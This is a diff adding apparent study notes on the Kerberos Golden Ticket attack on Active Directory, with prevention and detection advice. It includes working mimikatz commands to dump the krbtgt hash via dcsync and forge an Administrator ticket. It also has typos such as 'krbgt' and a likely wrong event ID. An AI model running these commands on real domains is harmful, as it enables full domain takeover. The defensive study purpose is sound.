@@ -1,0 +1,119 @@
+Description:
+
+  - Kerberos GOlden Ticket is an attack in which threat agents can create/generate
+    tickets for any user in the Domain, therefore acting as a Domain Controller.
+
+  - When Domain is created, the user account krbtgt is created by default. krbgt
+    is a disabled account that cannot be deleted, renamed, or enabled. the DC's 
+    service will use the password of krbgt to derive a key with which it signs all
+    kerberos tickets. 
+
+  - Any user possessing the password's hash of krbgt can create valid kerberos TGTs
+
+  - Golden Ticket attack allows us to escalate rights from any child domain to the 
+    parent in the same forest
+
+  - Occurs after an adversary has gained Domain Admin privileges.
+
+
+Attack:
+
+  - Utilize mimikatz with the following arguments:
+    /domain: the domain's name
+    /sid: the domain's SID value
+    /rc4: the password's hash of krbgt
+    /user: the username for which mimikatz will issue the ticket
+    /id: relative ID (last part of SID) for the user for whom Mimikatz will issue
+    the ticket.
+    /renewmax: the maximum number of days the ticket can be renewed
+    /endin: end of life for the ticket
+
+  - First, obtain the password's hash of krbgt and the SID value of the domain
+    mimikatz.exe
+    lsadump::dcsync /domain:eagle.local /user:krbgt
+
+    powershell -exec bypass
+
+    .\PowerView.ps1
+    Get-DomainSID
+
+    kerberos::golden /domain:eagle.local /sid:xxxxxxxxxxx /rc4:xxxxxxxxxxxxxxxx /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
+      - /ptt passes the ticket into the current session
+
+    klist
+      - This verifies the ticket
+
+    dir \\dc1\c$
+      - Lists the content of the C$ share of DC1 to verify the ticket is working.
+
+
+
+Prevention:
+  - Block privileged users from authenticating to any device.
+
+  - Periodically reset the password of the krbtgt account; the secrecy of this hash 
+    value is crucial to Active Directory. When resetting the password of krbtgt (regardless 
+    of the password's strength), it will always be overwritten with a new randomly generated 
+    and cryptographically secure one. Utilizing Microsoft's script for changing the password 
+    of krbtgt KrbtgtKeys.ps1 is highly recommended as it has an audit mode that checks the 
+    domain for preventing impacts upon password change. It also forces DC replication across 
+    the globe so all Domain Controllers sync the new value instantly, reducing potential 
+    business disruptions.
+
+  - Enforce SIDHistory filtering between the domains in forests to prevent the escalation 
+    from a child domain to a parent domain (because the escalation path involves abusing the 
+    SIDHistory property by setting it to that of a privileged group, for example, Enterprise Admins). 
+    However, doing this may result in potential issues in migrating domain
+
+
+
+Detection:
+
+  - Correlating users' behavior
+
+  - Proactively monitor Event 4624 ad 4625
+
+  - 4675 and 4769
+
+  - If an Active Directory forest has been compromised, we need to reset all users' passwords and revoke 
+    all certificates, and for krbtgt, we must reset its password twice (in every domain). The password 
+    history value for the krbtgt account is 2. Therefore it stores the two most recent passwords. By 
+    resetting the password twice, we effectively clear any old passwords from the history, so there is no 
+    way another DC will replicate this DC by using an old password. However, it is recommended that this 
+    password reset occur at least 10 hours apart from each other (maximum user ticket lifetime); otherwise, 
+    expect some services to break if done in a shorter period.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
